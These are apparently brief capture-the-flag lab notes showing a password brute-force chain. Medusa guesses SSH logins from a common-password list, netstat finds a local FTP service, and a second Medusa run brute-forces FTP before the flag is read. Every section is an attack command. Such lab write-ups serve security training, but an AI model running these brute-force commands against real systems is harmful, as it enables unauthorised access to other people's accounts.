```shell-session
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

## Gaining access
```shell-session
ssh sshuser@<IP> -p PORT
```

## Expanding the Attack Surface
- Once inside the system, we must find potential attack surfaces (FTP is up)
```shell-session
netstat -tulpn | grep LISTEN
```

## Targeting the FTP Server
```shell-session
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

## Retreiving the flag
```shell-session
ftp ftp://ftpuser:<PASWORD>@localhost
```
```shell-session
cat flag.txt
```

